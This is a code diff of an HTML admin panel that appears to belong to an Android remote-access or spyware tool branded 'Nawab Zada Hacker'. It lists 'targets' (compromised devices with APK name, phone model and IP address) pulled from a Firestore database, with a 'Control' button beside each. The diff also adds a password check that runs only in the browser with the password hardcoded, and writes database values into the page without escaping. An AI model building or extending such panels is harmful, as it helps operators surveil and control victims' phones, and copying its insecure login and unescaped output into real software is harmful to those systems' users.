@@ -3,59 +3,104 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Admin Panel - Anti Black Maling</title>
+    <title>Owner Admin Panel</title>
     <link rel="stylesheet" href="style.css">
     <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
     <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-firestore-compat.js"></script>
 </head>
-<body class="admin-layout">
+<body class="admin-bg">
 
-    <!-- Sidebar -->
-    <aside class="sidebar">
-        <div class="brand">
-            <h3>🦅 Nawab Zada Hacker</h3>
-            <p>v1.0 Ultimate</p>
+    <!-- Login Overlay -->
+    <div id="loginOverlay" class="overlay">
+        <div class="login-box">
+            <h2>🔒 Owner Access</h2>
+            <input type="password" id="adminPass" placeholder="Enter Password">
+            <button onclick="checkPassword()">Unlock</button>
+            <p id="passError" style="color:red; display:none;">Wrong Password!</p>
         </div>
-        <nav>
-            <button onclick="window.location.href='index.html'" class="nav-btn">Home</button>
-            <button onclick="app.logout()" class="nav-btn logout">Logout</button>
-        </nav>
-    </aside>
+    </div>
 
-    <!-- Main Dashboard -->
-    <main class="dashboard-content">
-        <header class="dash-header">
-            <h1>🎯 Target Dashboard</h1>
-            <div class="stats-box">
-                <span id="totalTargets">0 Targets</span> | 
-                <span id="activeDevices">0 Active</span>
-            </div>
+    <!-- Admin Dashboard (Hidden until login) -->
+    <div id="adminDashboard" class="main-content admin-view">
+        <header>
+            <h1>👑 Super Admin Panel</h1>
+            <button onclick="logout()" class="btn-danger">Logout</button>
         </header>
 
-        <!-- Stats Grid -->
-        <div class="stats-grid">
-            <div class="stat-card">
-                <h4>Total Devices</h4>
-                <p id="countTotal" class="big-number">0</p>
-            </div>
-            <div class="stat-card">
-                <h4>Online Now</h4>
-                <p id="countOnline" class="big-number text-green">0</p>
-            </div>
+        <div class="stats-row">
+            <div class="stat-box"><h3>Total Targets</h3><p id="totalTargets">0</p></div>
+            <div class="stat-box"><h3>All Devices</h3><p>Real-time Sync</p></div>
         </div>
 
-        <!-- Target List Container -->
-        <div class="target-list-wrapper">
-            <h2>📡 Live Targets</h2>
-            <div id="targetsGrid" class="grid-container">
-                <!-- JS will inject cards here -->
-                <p>Loading...</p>
-            </div>
+        <div class="card">
+            <h3>📡 All Connected Targets</h3>
+            <table id="adminTable">
+                <thead>
+                    <tr>
+                        <th>APK Name</th>
+                        <th>Model</th>
+                        <th>IP Address</th>
+                        <th>Status</th>
+                        <th>Action</th>
+                    </tr>
+                </thead>
+                <tbody id="adminTableBody">
+                    <!-- Data loads here -->
+                </tbody>
+            </table>
         </div>
-    </main>
+    </div>
 
-    <!-- Admin Logic Script -->
     <script src="firebase-config.js"></script>
-    <script src="admin-logic.js"></script>
+    <script>
+        const adminApp = {
+            checkPassword: function() {
+                const pass = document.getElementById('adminPass').value;
+                // Set your password here
+                if(pass === "NawabZada2024") {
+                    document.getElementById('loginOverlay').style.display = 'none';
+                    this.loadAllTargets();
+                } else {
+                    document.getElementById('passError').style.display = 'block';
+                }
+            },
+            loadAllTargets: async function() {
+                const tbody = document.getElementById('adminTableBody');
+                tbody.innerHTML = '<tr><td colspan="5">Loading...</td></tr>';
+                
+                try {
+                    const snapshot = await db.collection("targets").get();
+                    let html = '';
+                    let count = 0;
+
+                    snapshot.forEach(doc => {
+                        const data = doc.data();
+                        count++;
+                        html += `
+                            <tr>
+                                <td>${data.apkName || 'Unknown'}</td>
+                                <td>${data.model}</td>
+                                <td>${data.ip}</td>
+                                <td style="color:green">Active</td>
+                                <td><button onclick="alert('Opening Remote View...')">Control</button></td>
+                            </tr>
+                        `;
+                    });
+
+                    if(count === 0) html = '<tr><td colspan="5">No targets yet.</td></tr>';
+                    
+                    tbody.innerHTML = html;
+                    document.getElementById('totalTargets').innerText = count;
+
+                } catch(e) {
+                    console.error(e);
+                    tbody.innerHTML = '<tr><td colspan="5">Error loading data</td></tr>';
+                }
+            }
+        };
+
+        function checkPassword() { adminApp.checkPassword(); }
+        function logout() { location.reload(); }
+    </script>
 </body>
 </html>
